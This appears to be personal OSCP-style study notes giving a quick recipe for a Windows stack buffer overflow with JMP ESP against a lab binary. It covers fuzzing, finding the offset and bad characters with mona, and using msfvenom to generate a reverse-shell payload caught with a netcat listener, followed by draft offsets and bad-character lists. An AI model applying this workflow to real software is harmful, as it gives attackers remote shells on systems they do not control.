## BOF + JMP ESP quickly

1. run imunity as admin

2. open oscp.exe

3. add mona to path: `!mona config -set workingfolder c:\mona\%p`

4. run fuzzer.py

5. generate pattern: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <fuzzer length + 400>` and place it in payload variable in exploit.py

6. crash the app. find the EIP addr/offset: `!mona findmsp -distance <fuzzer length + 400>` then set offset variable in exploit.py ("EIP contains normal pattern : ... (offset XXXX)")

7. generate badchars: `!mona bytearray -b "\x00"`

8. find bachars :
    run badchar.py and place it in payload variable
    run exploit.py crash the vulnerable app
    `!mona bytearray -b "\x00"` 
    `!mona compare -f C:\mona\oscp\bytearray.bin -a < ESP address>`
    ne prendre en compte que les premiers chars d'une suite

9. find jmp esp: `!mona jmp -r esp -cpb "\x00\x<badchars>"` and set rtn variable in exploit.py

10. generate payload for exploit.py `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x<badchars>" -f c`

11. set pading in exploit.py: `padding = "\x90" * 16`

12. set nc listenet and run exploit.py




### draft:

Fuzzing crashed at 1000 bytes

offset: 537



bad char 00 01 02 03 04 a0 01 ad ae be bf de df ef f0

\x00\x08\x2c\xad


\x00\x23\x3c\x83\xba

JMP ESP: 004012D0

\x00\xa0\xad\xbe\xde\xef